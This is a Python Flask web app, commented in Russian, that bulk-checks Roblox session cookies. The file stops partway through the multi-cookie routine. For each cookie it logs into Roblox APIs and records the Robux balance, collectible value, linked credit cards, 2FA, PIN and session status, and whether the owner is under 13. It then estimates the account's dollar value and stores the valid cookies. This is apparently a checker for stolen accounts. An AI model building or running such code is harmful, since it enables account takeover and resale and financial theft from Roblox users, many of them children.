import os
import json
import zipfile
import io
import sqlite3
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, send_file
import requests
import time
import re
import hashlib
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from threading import Timer
import asyncio
import aiohttp
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['DATABASE'] = 'checker_history.db'

# Активные пользователи (сессии)
active_sessions = {}
session_lock = threading.Lock()
SESSION_TIMEOUT = 300  # 5 минут

def cleanup_sessions():
    with session_lock:
        current_time = time.time()
        expired_sessions = []
        for session_id, session_data in active_sessions.items():
            if current_time - session_data['last_active'] > SESSION_TIMEOUT:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            del active_sessions[session_id]
    
    Timer(60, cleanup_sessions).start()

cleanup_sessions()

def init_db():
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS check_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                user_id TEXT,
                total_cookies INTEGER,
                valid_cookies INTEGER,
                check_date TEXT,
                results TEXT
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS global_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                total_checked INTEGER DEFAULT 0,
                valid_accounts INTEGER DEFAULT 0,
                last_updated TEXT
            )
        ''')
        conn.commit()
        conn.close()
        print("Database initialized successfully")
    except Exception as e:
        print(f"Database initialization error: {e}")

init_db()

def update_global_stats(total_checked=0, valid_accounts=0):
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        now = datetime.now().isoformat()
        
        c.execute('SELECT * FROM global_stats WHERE id = 1')
        existing = c.fetchone()
        
        if existing:
            c.execute('''
                UPDATE global_stats SET 
                total_checked = total_checked + ?,
                valid_accounts = valid_accounts + ?,
                last_updated = ?
                WHERE id = 1
            ''', (total_checked, valid_accounts, now))
        else:
            c.execute('''
                INSERT INTO global_stats (total_checked, valid_accounts, last_updated)
                VALUES (?, ?, ?)
            ''', (total_checked, valid_accounts, now))
        
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error updating global stats: {e}")

def get_global_stats():
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('SELECT * FROM global_stats WHERE id = 1')
        result = c.fetchone()
        conn.close()
        
        if result:
            return {
                'total_checked': result[1],
                'valid_accounts': result[2],
                'last_updated': result[3]
            }
        return {'total_checked': 0, 'valid_accounts': 0, 'last_updated': datetime.now().isoformat()}
    except Exception as e:
        return {'total_checked': 0, 'valid_accounts': 0, 'last_updated': datetime.now().isoformat()}

def get_active_users_count():
    with session_lock:
        current_time = time.time()
        active_count = 0
        for session_id, session_data in active_sessions.items():
            if current_time - session_data['last_active'] <= SESSION_TIMEOUT:
                active_count += 1
        return active_count

def update_user_session(session_id, user_data=None):
    with session_lock:
        active_sessions[session_id] = {
            'last_active': time.time(),
            'user_data': user_data or {},
            'created': active_sessions.get(session_id, {}).get('created', time.time())
        }

def get_user_id():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        unique_string = f"{ip}-{user_agent}"
        return hashlib.md5(unique_string.encode()).hexdigest()
    except:
        return str(uuid.uuid4())

def save_check_session(session_id, user_id, total, valid, results):
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''
            INSERT INTO check_history 
            (session_id, user_id, total_cookies, valid_cookies, check_date, results)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (session_id, user_id, total, valid, datetime.now().isoformat(), json.dumps(results)))
        conn.commit()
        conn.close()
        
        update_global_stats(total, valid)
        return True
    except Exception as e:
        print(f"Error saving session: {e}")
        return False

def get_user_history(user_id, limit=20):
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''
            SELECT * FROM check_history 
            WHERE user_id = ?
            ORDER BY check_date DESC 
            LIMIT ?
        ''', (user_id, limit))
        history = c.fetchall()
        conn.close()
        
        result = []
        for item in history:
            result.append({
                'id': item[0],
                'session_id': item[1],
                'user_id': item[2],
                'total_cookies': item[3],
                'valid_cookies': item[4],
                'check_date': item[5],
                'results': json.loads(item[6]) if item[6] else []
            })
        return result
    except Exception as e:
        return []

def get_session_results(session_id, user_id):
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('SELECT results FROM check_history WHERE session_id = ? AND user_id = ?', (session_id, user_id))
        result = c.fetchone()
        conn.close()
        return json.loads(result[0]) if result else None
    except:
        return None

# Улучшенный класс для проверки Roblox куки
class AdvancedRobloxChecker:
    def __init__(self):
        self.timeout = 60  # Увеличенный таймаут для Railway
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }

    def clean_cookie(self, cookie):
        """Тщательная очистка куки"""
        if not cookie or len(cookie) < 100:
            return None
            
        cookie = cookie.strip()
        
        # Убираем кавычки
        if cookie.startswith('"') and cookie.endswith('"'):
            cookie = cookie[1:-1]
        if cookie.startswith("'") and cookie.endswith("'"):
            cookie = cookie[1:-1]
        
        # Убираем лишние пробелы и переносы
        cookie = re.sub(r'\s+', '', cookie)
        
        # Проверяем базовый формат Roblox куки
        if not cookie.startswith('_|WARNING:-DO-NOT-SHARE-THIS.'):
            # Попробуем найти куки в строке
            cookie_match = re.search(r'_\|WARNING:-DO-NOT-SHARE-THIS\.[^_]*_', cookie)
            if cookie_match:
                cookie = cookie_match.group(0)
            else:
                return None
            
        return cookie if len(cookie) > 100 else None

    async def get_csrf_token(self, session, cookie):
        """Получение CSRF токена"""
        try:
            async with session.post(
                'https://auth.roblox.com/v2/login',
                headers={'Cookie': f'.ROBLOSECURITY={cookie}'},
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                if response.status == 403 and 'x-csrf-token' in response.headers:
                    return response.headers['x-csrf-token']
            
            # Альтернативные endpoints для получения CSRF
            endpoints = [
                'https://www.roblox.com/game/GetCurrentUser',
                'https://accountsettings.roblox.com/v1/email',
                'https://users.roblox.com/v1/users/authenticated'
            ]
            
            for endpoint in endpoints:
                try:
                    async with session.post(
                        endpoint,
                        headers={'Cookie': f'.ROBLOSECURITY={cookie}'},
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        if 'x-csrf-token' in response.headers:
                            return response.headers['x-csrf-token']
                except:
                    continue
                    
        except Exception as e:
            print(f"CSRF token error: {e}")
            
        return None

    async def make_authenticated_request(self, session, url, cookie, method='GET', retry_count=3):
        """Улучшенный запрос с обработкой CSRF токена"""
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            **self.headers
        }
        
        for attempt in range(retry_count):
            try:
                if method.upper() == 'POST':
                    csrf_token = await self.get_csrf_token(session, cookie)
                    if csrf_token:
                        headers['X-CSRF-TOKEN'] = csrf_token
                
                if method.upper() == 'POST':
                    async with session.post(url, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as response:
                        if response.status == 200:
                            return await response.json()
                        elif response.status == 401:
                            return None
                        elif response.status == 403 and attempt < retry_count - 1:
                            await asyncio.sleep(1)
                            continue
                        elif response.status == 429:
                            await asyncio.sleep(3)
                            continue
                        else:
                            return None
                else:
                    async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as response:
                        if response.status == 200:
                            return await response.json()
                        elif response.status == 401:
                            return None
                        elif response.status == 429 and attempt < retry_count - 1:
                            await asyncio.sleep(3)
                            continue
                        else:
                            return None
                            
            except asyncio.TimeoutError:
                if attempt < retry_count - 1:
                    await asyncio.sleep(2)
                    continue
            except Exception as e:
                if attempt < retry_count - 1:
                    await asyncio.sleep(1)
                    continue
                    
        return None

    async def verify_cookie(self, session, cookie):
        """Проверка валидности куки через несколько методов"""
        try:
            # Метод 1: Стандартная проверка аутентификации
            auth_url = 'https://users.roblox.com/v1/users/authenticated'
            auth_data = await self.make_authenticated_request(session, auth_url, cookie, 'GET')
            
            if auth_data and 'id' in auth_data:
                return auth_data
            
            # Метод 2: Альтернативная проверка через mobile API
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_data = await self.make_authenticated_request(session, mobile_url, cookie, 'GET')
            
            if mobile_data and 'UserID' in mobile_data:
                return {
                    'id': mobile_data['UserID'],
                    'name': mobile_data['UserName'],
                    'displayName': mobile_data.get('DisplayName', mobile_data['UserName']),
                    'created': mobile_data.get('Created', '')
                }
            
            return None
            
        except Exception as e:
            print(f"Cookie verification error: {e}")
            return None

    async def get_account_info(self, cookie):
        """Основная функция получения информации об аккаунте"""
        try:
            async with aiohttp.ClientSession() as session:
                # Проверяем валидность куки
                auth_data = await self.verify_cookie(session, cookie)
                
                if not auth_data:
                    return None
                
                user_id = auth_data['id']
                
                # Получаем полную информацию об аккаунте
                account_info = await self.get_complete_account_info(session, cookie, user_id, auth_data)
                return account_info
                
        except Exception as e:
            print(f"Account info error: {e}")
            return None

    async def get_account_age_info(self, created_date_str):
        """Получение информации о возрасте аккаунта - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
        try:
            if not created_date_str:
                # Пробуем получить дату через альтернативный метод
                return await self.get_account_age_fallback()
            
            # Нормализуем строку даты
            created_date_str = created_date_str.replace('Z', '').split('.')[0]
            
            # Пробуем разные форматы дат
            date_formats = [
                '%Y-%m-%dT%H:%M:%S',
                '%Y-%m-%d %H:%M:%S',
                '%Y/%m/%d %H:%M:%S',
                '%Y-%m-%d'
            ]
            
            created_date = None
            for fmt in date_formats:
                try:
                    created_date = datetime.strptime(created_date_str, fmt)
                    break
                except ValueError:
                    continue
            
            if not created_date:
                return await self.get_account_age_fallback()
            
            now = datetime.now()
            age_delta = now - created_date
            age_days = age_delta.days
            age_years = age_days / 365.25
            
            return {
                'account_age_days': age_days,
                'account_age_years': round(age_years, 1),
                'formatted_date': created_date.strftime('%d.%m.%Y')
            }
            
        except Exception as e:
            print(f"Account age error: {e}")
            return await self.get_account_age_fallback()

    async def get_account_age_fallback(self):
        """Альтернативный метод получения даты создания"""
        try:
            # Можно добавить дополнительные методы если основной не работает
            return {
                'account_age_days': 0,
                'account_age_years': 0,
                'formatted_date': 'Unknown'
            }
        except:
            return {
                'account_age_days': 0,
                'account_age_years': 0,
                'formatted_date': 'Unknown'
            }

    async def get_premium_status(self, session, cookie, user_id):
        """Статус Premium - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            # Метод 1: Через экономику (самый надежный)
            economy_url = f'https://economy.roblox.com/v1/users/{user_id}/currency'
            economy_data = await self.make_authenticated_request(session, economy_url, cookie, 'GET')
            
            if economy_data:
                # Проверяем наличие премиум стипендии
                if economy_data.get('premiumStipend', 0) > 0:
                    return {
                        'premium': True,
                        'premium_status': 'Active'
                    }
            
            # Метод 2: Через API премиум функций
            premium_url = 'https://premiumfeatures.roblox.com/v1/users/premium/membership'
            premium_data = await self.make_authenticated_request(session, premium_url, cookie, 'GET')
            
            if premium_data and premium_data.get('hasPremiumMembership'):
                return {
                    'premium': True,
                    'premium_status': 'Active'
                }
            
            # Метод 3: Через профиль пользователя
            profile_url = f'https://users.roblox.com/v1/users/{user_id}'
            profile_data = await self.make_authenticated_request(session, profile_url, cookie, 'GET')
            
            if profile_data and profile_data.get('hasPremium'):
                return {
                    'premium': True,
                    'premium_status': 'Active'
                }
            
            # Метод 4: Через HTML страницу профиля
            html_profile_url = f'https://www.roblox.com/users/{user_id}/profile'
            headers = {
                'Cookie': f'.ROBLOSECURITY={cookie}',
                **self.headers
            }
            
            async with session.get(html_profile_url, headers=headers, timeout=10) as response:
                if response.status == 200:
                    html = await response.text()
                    # Ищем признаки премиум в HTML
                    if 'premium-icon' in html or 'Premium Member' in html or 'ROBLOX Premium' in html:
                        return {
                            'premium': True,
                            'premium_status': 'Active'
                        }
            
            # Метод 5: Через каталог (часто показывает премиум статус)
            catalog_url = f'https://catalog.roblox.com/v1/users/{user_id}/items?assetType=Shirt&limit=1'
            catalog_data = await self.make_authenticated_request(session, catalog_url, cookie, 'GET')
            
            # Если все методы не дали результата - считаем что премиум нет
            return {'premium': False, 'premium_status': 'Inactive'}
                    
        except Exception as e:
            print(f"Premium status error: {e}")
            return {'premium': False, 'premium_status': 'Inactive'}

    async def get_total_spent_robux(self, session, cookie, user_id):
        """Общие траты за все время - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
        try:
            total_spent = 0
            
            # Получаем ВСЕ транзакции типа Purchase
            url = f'https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100'
            all_transactions = []
            
            # Обрабатываем пагинацию
            while url:
                data = await self.make_authenticated_request(session, url, cookie, 'GET')
                
                if not data or 'data' not in data:
                    break
                    
                all_transactions.extend(data['data'])
                
                # Проверяем есть ли следующая страница
                if data.get('nextPageCursor'):
                    url = f'https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100&cursor={data["nextPageCursor"]}'
                else:
                    url = None
                # Ограничим количество страниц для производительности
                if len(all_transactions) >= 1000:
                    break
            
            # Суммируем все траты
            for transaction in all_transactions:
                if (transaction.get('currency') and 
                    transaction['currency'].get('amount') and 
                    transaction['currency']['amount'] < 0):
                    total_spent += abs(transaction['currency']['amount'])
            
            return {'total_spent_robux': total_spent}
            
        except Exception as e:
            print(f"Total spent error: {e}")
            return {'total_spent_robux': 0}

    async def get_economy_info(self, session, cookie, user_id):
        """Информация об экономике"""
        try:
            url = f'https://economy.roblox.com/v1/users/{user_id}/currency'
            data = await self.make_authenticated_request(session, url, cookie, 'GET')
            
            if data:
                robux_balance = data.get('robux', 0)
                pending_robux = data.get('pendingRobux', 0)
                return {
                    'robux_balance': robux_balance,
                    'pending_robux': pending_robux,
                    'total_robux': robux_balance + pending_robux
                }
        except Exception as e:
            print(f"Economy info error: {e}")
        
        return {'robux_balance': 0, 'pending_robux': 0, 'total_robux': 0}

    async def get_social_info(self, session, cookie, user_id):
        """Социальная информация - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
        try:
            # Друзья
            friends_url = f'https://friends.roblox.com/v1/users/{user_id}/friends/count'
            friends_data = await self.make_authenticated_request(session, friends_url, cookie, 'GET')
            
            # Подписчики и подписки
            followers_url = f'https://friends.roblox.com/v1/users/{user_id}/followers/count'
            followers_data = await self.make_authenticated_request(session, followers_url, cookie, 'GET')
            
            following_url = f'https://friends.roblox.com/v1/users/{user_id}/followings/count'
            following_data = await self.make_authenticated_request(session, following_url, cookie, 'GET')
            
            return {
                'friends_count': friends_data.get('count', 0) if friends_data else 0,
                'followers_count': followers_data.get('count', 0) if followers_data else 0,
                'following_count': following_data.get('count', 0) if following_data else 0
            }
        except Exception as e:
            print(f"Social info error: {e}")
        
        return {'friends_count': 0, 'followers_count': 0, 'following_count': 0}

    async def get_security_info(self, session, cookie, user_id):
        """Информация о безопасности - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
        try:
            # Основная проверка 2FA
            two_step_url = f'https://twostepverification.roblox.com/v1/users/{user_id}/configuration'
            two_step_data = await self.make_authenticated_request(session, two_step_url, cookie, 'GET')
            
            two_fa_enabled = False
            if two_step_data and two_step_data.get('twoStepVerificationEnabled'):
                two_fa_enabled = True
            
            return {'2fa_enabled': two_fa_enabled}
            
        except Exception as e:
            print(f"Security info error: {e}")
        
        return {'2fa_enabled': False}

    async def get_rap_value(self, session, cookie, user_id):
        """RAP стоимость инвентаря"""
        try:
            rap_value = 0
            url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=50'
            data = await self.make_authenticated_request(session, url, cookie, 'GET')
            
            if data and 'data' in data:
                for item in data['data']:
                    if item.get('recentAveragePrice'):
                        rap_value += item['recentAveragePrice']
            
            return {'rap_value': rap_value}
        except Exception as e:
            print(f"RAP value error: {e}")
        
        return {'rap_value': 0}

    async def get_card_info(self, session, cookie):
        """Информация о привязанных картах"""
        try:
            # Упрощенная проверка карт
            billing_url = 'https://billing.roblox.com/v1/paymentmethods'
            billing_data = await self.make_authenticated_request(session, billing_url, cookie, 'GET')
            
            card_count = 0
            if billing_data and 'paymentMethods' in billing_data:
                for method in billing_data['paymentMethods']:
                    if method.get('type') == 'CreditCard':
                        card_count += 1
            
            return {'card_count': card_count}
            
        except Exception as e:
            print(f"Card info error: {e}")
        
        return {'card_count': 0}

    async def get_user_profile_info(self, session, cookie, user_id):
        """Информация профиля пользователя - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            url = f'https://users.roblox.com/v1/users/{user_id}'
            data = await self.make_authenticated_request(session, url, cookie, 'GET')
            
            if data:
                # Получаем дополнительную информацию о возрасте
                above_13 = 'Unknown'
                if data.get('is13Plus') is not None:
                    above_13 = 'Yes' if data['is13Plus'] else 'No'
                elif data.get('ageBracket') == 1:  # 13+
                    above_13 = 'Yes'
                elif data.get('ageBracket') == 0:  # Under 13
                    above_13 = 'No'
                
                return {
                    'description': data.get('description', ''),
                    'followers_count': data.get('followersCount', 0),
                    'following_count': data.get('followingsCount', 0),
                    'above_13': above_13,
                    'created': data.get('created', '')
                }
        except Exception as e:
            print(f"Profile info error: {e}")
        
        return {
            'description': '', 
            'followers_count': 0, 
            'following_count': 0,
            'above_13': 'Unknown',
            'created': ''
        }

    async def get_privacy_settings(self, session, cookie, user_id):
        """Настройки приватности - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            # Метод 1: Через API приватности
            privacy_api_url = 'https://accountsettings.roblox.com/v1/privacy'
            privacy_data = await self.make_authenticated_request(session, privacy_api_url, cookie, 'GET')
            
            if privacy_data:
                inventory_privacy = privacy_data.get('inventoryPrivacy', 'Unknown')
                trade_privacy = privacy_data.get('tradePrivacy', 'Unknown')
                
                # Преобразуем значения
                privacy_map = {
                    'All': 'Everyone',
                    'AllUsers': 'Everyone',
                    'Friends': 'Friends',
                    'NoOne': 'NoOne',
                    'None': 'NoOne'
                }
                
                inventory_privacy = privacy_map.get(inventory_privacy, inventory_privacy)
                trade_privacy = privacy_map.get(trade_privacy, trade_privacy)
                
                if inventory_privacy != 'Unknown' and trade_privacy != 'Unknown':
                    return {
                        'inventory_privacy': inventory_privacy,
                        'trade_privacy': trade_privacy
                    }
            
            # Метод 2: Через HTML страницу настроек
            settings_url = 'https://www.roblox.com/my/account'
            headers = {
                'Cookie': f'.ROBLOSECURITY={cookie}',
                **self.headers
            }
            
            async with session.get(settings_url, headers=headers, timeout=15) as response:
                if response.status == 200:
                    html = await response.text()
                    
                    # Ищем настройки приватности в данных
                    import json
                    
                    # Пытаемся найти JSON данные
                    json_match = re.search(r'window\.rbxSettings = ({.*?});', html)
                    if json_match:
                        try:
                            settings_data = json.loads(json_match.group(1))
                            privacy_settings = settings_data.get('PrivacySettings', {})
                            
                            inventory_privacy = privacy_settings.get('InventoryPrivacy', 'Unknown')
                            trade_privacy = privacy_settings.get('TradePrivacy', 'Unknown')
                            
                            if inventory_privacy != 'Unknown' and trade_privacy != 'Unknown':
                                return {
                                    'inventory_privacy': inventory_privacy,
                                    'trade_privacy': trade_privacy
                                }
                        except:
                            pass
                    
                    # Альтернативный поиск в HTML
                    inventory_match = re.search(r'InventoryPrivacy[^>]*>[\s\S]*?<option[^>]*selected[^>]*>([^<]+)', html, re.IGNORECASE)
                    trade_match = re.search(r'TradePrivacy[^>]*>[\s\S]*?<option[^>]*selected[^>]*>([^<]+)', html, re.IGNORECASE)
                    
                    inventory_privacy = 'Unknown'
                    trade_privacy = 'Unknown'
                    
                    if inventory_match:
                        inventory_privacy = inventory_match.group(1).strip()
                    if trade_match:
                        trade_privacy = trade_match.group(1).strip()
                    
                    # Если нашли значения, возвращаем их
                    if inventory_privacy != 'Unknown' or trade_privacy != 'Unknown':
                        return {
                            'inventory_privacy': inventory_privacy or 'Unknown',
                            'trade_privacy': trade_privacy or 'Unknown'
                        }
            
            # Метод 3: Установим значения по умолчанию для новых аккаунтов
            return {
                'inventory_privacy': 'Everyone',  # По умолчанию для новых аккаунтов
                'trade_privacy': 'Everyone'       # По умолчанию для новых аккаунтов
            }
                        
        except Exception as e:
            print(f"Privacy settings error: {e}")
        
        # Fallback значения
        return {
            'inventory_privacy': 'Everyone',
            'trade_privacy': 'Everyone'
        }

    async def get_contact_info(self, session, cookie, user_id):
        """Информация о контактах и возрасте - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            # Получаем основную информацию о пользователе
            user_url = f'https://users.roblox.com/v1/users/{user_id}'
            user_data = await self.make_authenticated_request(session, user_url, cookie, 'GET')
            
            above_13 = 'Unknown'
            if user_data:
                # Проверяем возраст через несколько полей
                if user_data.get('is13Plus') is not None:
                    above_13 = 'Yes' if user_data['is13Plus'] else 'No'
                elif user_data.get('ageBracket') == 1:  # 13+
                    above_13 = 'Yes'
                elif user_data.get('ageBracket') == 0:  # Under 13
                    above_13 = 'No'
            
            # Если не определили через API, пробуем через HTML
            if above_13 == 'Unknown':
                profile_url = f'https://www.roblox.com/users/{user_id}/profile'
                headers = {
                    'Cookie': f'.ROBLOSECURITY={cookie}',
                    **self.headers
                }
                
                async with session.get(profile_url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        html = await response.text()
                        # Ищем признаки возраста в HTML
                        if '13+' in html or 'over13' in html.lower():
                            above_13 = 'Yes'
                        elif 'under13' in html.lower() or '<13' in html:
                            above_13 = 'No'
            
            # Проверяем привязан ли email
            email_url = 'https://accountsettings.roblox.com/v1/email'
            email_data = await self.make_authenticated_request(session, email_url, cookie, 'GET')
            
            email_status = 'Unknown'
            if email_data:
                if email_data.get('verified', False):
                    email_status = 'Verified'
                else:
                    email_status = 'Unverified'
            
            # Проверяем привязан ли телефон
            phone_url = 'https://accountsettings.roblox.com/v1/phone'
            phone_data = await self.make_authenticated_request(session, phone_url, cookie, 'GET')
            
            phone_status = 'No'
            if phone_data and phone_data.get('verified', False):
                phone_status = 'Yes'
            
            # Проверяем PIN
            pin_url = 'https://auth.roblox.com/v1/account/pin'
            pin_data = await self.make_authenticated_request(session, pin_url, cookie, 'GET')
            
            pin_enabled = False
            if pin_data and pin_data.get('isEnabled', False):
                pin_enabled = True
            
            # Получаем информацию о сессиях
            sessions_count = await self.get_sessions_count(session, cookie)
            
            return {
                'email_status': email_status,
                'phone_status': phone_status,
                'pin_enabled': pin_enabled,
                'above_13': above_13,
                'verified_age': 'No',  # По умолчанию
                'sessions_count': sessions_count
            }
            
        except Exception as e:
            print(f"Contact info error: {e}")
        
        return {
            'email_status': 'Unknown',
            'phone_status': 'No',
            'pin_enabled': False,
            'above_13': 'Unknown',
            'verified_age': 'No',
            'sessions_count': 1
        }

    async def get_sessions_count(self, session, cookie):
        """Получение количества активных сессий - УЛУЧШЕННАЯ ВЕРСИЯ"""
        try:
            sessions_url = 'https://auth.roblox.com/v1/account/sessions'
            sessions_data = await self.make_authenticated_request(session, sessions_url, cookie, 'GET')
            
            if sessions_data and isinstance(sessions_data, list):
                # Фильтруем активные сессии (исключаем текущую)
                active_sessions = [s for s in sessions_data if s.get('isCurrent') is False]
                return len(active_sessions) + 1  # +1 для текущей сессии
            
            # Fallback: через HTML страницу
            security_url = 'https://www.roblox.com/my/account/security'
            headers = {
                'Cookie': f'.ROBLOSECURITY={cookie}',
                **self.headers
            }
            
            async with session.get(security_url, headers=headers, timeout=10) as response:
                if response.status == 200:
                    html = await response.text()
                    # Ищем количество сессий в HTML
                    sessions_match = re.search(r'(\d+)\s*active sessions?', html, re.IGNORECASE)
                    if sessions_match:
                        return int(sessions_match.group(1))
                    
                    # Альтернативный поиск
                    sessions_match = re.search(r'session.*?(\d+)', html, re.IGNORECASE)
                    if sessions_match:
                        return int(sessions_match.group(1))
            
            # Если не нашли, возвращаем 1 (текущая сессия)
            return 1
            
        except Exception as e:
            print(f"Sessions count error: {e}")
            return 1

    async def get_complete_account_info(self, session, cookie, user_id, auth_data):
        """Получение полной информации об аккаунте - ОБНОВЛЕННАЯ ВЕРСИЯ"""
        try:
            # Базовая информация
            base_info = {
                'username': auth_data.get('name', 'N/A'),
                'display_name': auth_data.get('displayName', auth_data.get('name', 'N/A')),
                'user_id': user_id,
                'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
                'created': auth_data.get('created', '')
            }
            
            # Получаем информацию профиля для даты создания
            profile_info = await self.get_user_profile_info(session, cookie, user_id)
            if profile_info.get('created'):
                base_info['created'] = profile_info['created']
            
            # Основные проверки
            tasks = [
                self.get_economy_info(session, cookie, user_id),
                self.get_premium_status(session, cookie, user_id),
                self.get_social_info(session, cookie, user_id),
                self.get_security_info(session, cookie, user_id),
                self.get_rap_value(session, cookie, user_id),
                self.get_card_info(session, cookie),
                self.get_total_spent_robux(session, cookie, user_id),
                self.get_account_age_info(base_info['created']),  # Используем обновленную дату
                self.get_privacy_settings(session, cookie, user_id),
                self.get_contact_info(session, cookie, user_id),
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Безопасное извлечение результатов
            economy = results[0] if not isinstance(results[0], Exception) else {}
            premium = results[1] if not isinstance(results[1], Exception) else {}
            social = results[2] if not isinstance(results[2], Exception) else {}
            security = results[3] if not isinstance(results[3], Exception) else {}
            rap_value = results[4] if not isinstance(results[4], Exception) else {}
            card = results[5] if not isinstance(results[5], Exception) else {}
            total_spent = results[6] if not isinstance(results[6], Exception) else {}
            age_info = results[7] if not isinstance(results[7], Exception) else {}
            privacy_settings = results[8] if not isinstance(results[8], Exception) else {}
            contact_info = results[9] if not isinstance(results[9], Exception) else {}
            
            # Объединяем все результаты
            base_info.update(economy)
            base_info.update(premium)
            base_info.update(social)
            base_info.update(security)
            base_info.update(rap_value)
            base_info.update(card)
            base_info.update(total_spent)
            base_info.update(age_info)
            base_info.update(privacy_settings)
            base_info.update(contact_info)
            base_info.update(profile_info)
            
            # Дефолтные значения для отсутствующих полей
            default_values = {
                'groups_owned': 0,
                'groups_pending': 0,
                'groups_funds': 0,
                'voice_enabled': 'No',
                'roblox_badges_count': 0,
                'billing_robux': 0,
            }
            
            base_info.update(default_values)
            
            # Расчет стоимости аккаунта
            base_info['account_value'] = self.calculate_account_value(base_info)
            
            return base_info
            
        except Exception as e:
            print(f"Complete account info error: {e}")
            return self.get_basic_account_info(auth_data, user_id)

    def calculate_account_value(self, account_info):
        """Расчет стоимости аккаунта"""
        try:
            robux = account_info.get('robux_balance', 0) or 0
            rap_value = account_info.get('rap_value', 0) or 0
            age_years = account_info.get('account_age_years', 0) or 0
            friends_count = account_info.get('friends_count', 0) or 0
            premium = account_info.get('premium', False)
            total_spent = account_info.get('total_spent_robux', 0) or 0
            
            value = robux * 0.0035
            value += rap_value * 0.001
            value += age_years * 200
            value += friends_count * 2
            value += total_spent * 0.0005
            
            if premium:
                value += 300
                
            return round(max(value, 5), 2)
        except Exception as e:
            print(f"Account value calculation error: {e}")
            return 5.0

    def get_basic_account_info(self, auth_data, user_id):
        """Базовая информация при ошибке"""
        return {
            'username': auth_data.get('name', 'N/A'),
            'display_name': auth_data.get('displayName', auth_data.get('name', 'N/A')),
            'user_id': user_id,
            'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
            'account_age_days': 0,
            'account_age_years': 0,
            'formatted_date': 'Unknown',
            'robux_balance': 0,
            'pending_robux': 0,
            'total_robux': 0,
            'premium': False,
            'premium_status': 'Inactive',
            'friends_count': 0,
            'followers_count': 0,
            'following_count': 0,
            '2fa_enabled': False,
            'rap_value': 0,
            'billing_robux': 0,
            'card_count': 0,
            'inventory_privacy': 'Unknown',
            'trade_privacy': 'Unknown',
            'sessions_count': 1,
            'email_status': 'Unknown',
            'phone_status': 'No',
            'pin_enabled': False,
            'groups_owned': 0,
            'groups_pending': 0,
            'groups_funds': 0,
            'above_13': 'Unknown',
            'verified_age': 'No',
            'voice_enabled': 'No',
            'roblox_badges_count': 0,
            'total_spent_robux': 0,
            'account_value': 0,
            'description': ''
        }

    async def check_single_cookie(self, cookie):
        """Проверка одной куки"""
        clean_cookie = self.clean_cookie(cookie)
        if not clean_cookie:
            return {
                'valid': False,
                'cookie': cookie,
                'error': 'Invalid cookie format',
                'checked_at': datetime.now().isoformat()
            }
        
        try:
            account_info = await self.get_account_info(clean_cookie)
            
            if account_info:
                return {
                    'valid': True,
                    'cookie': clean_cookie,
                    'account_info': account_info,
                    'checked_at': datetime.now().isoformat()
                }
            else:
                return {
                    'valid': False,
                    'cookie': clean_cookie,
                    'error': 'Authentication failed - cookie may be expired or invalid',
                    'checked_at': datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                'valid': False,
                'cookie': clean_cookie,
                'error': f'Check error: {str(e)}',
                'checked_at': datetime.now().isoformat()
            }

    async def check_multiple_cookies(self, cookies):
        """Проверка нескольких куки"""
        valid_cookies = []
        
        for cookie in cookies:
            clean_cookie = self.clean_cookie(cookie)
            if clean_cookie and clean_cookie not in valid_cookies:
                valid_cookies.append(clean_cookie)
        
        if not valid_cookies:
            return [{
                'valid': False,
                'cookie': "",
                'error': "No valid cookies found",
                'checked_at': datetime.now().isoformat()
            }]
        
        # Проверка с ограничением параллельных запросов
        semaphore = asyncio.Semaphore(2)  # Увеличено для производительности
        
        async def check_with_semaphore(cookie):
            async with semaphore:
                await asyncio.sleep(1)  # Задержка между запросами
                return await self.check_single_cookie(cookie)
        
        tasks = [check_with_semaphore(cookie) for cookie in valid_cookies]
        results = await asyncio.gather(*tasks)
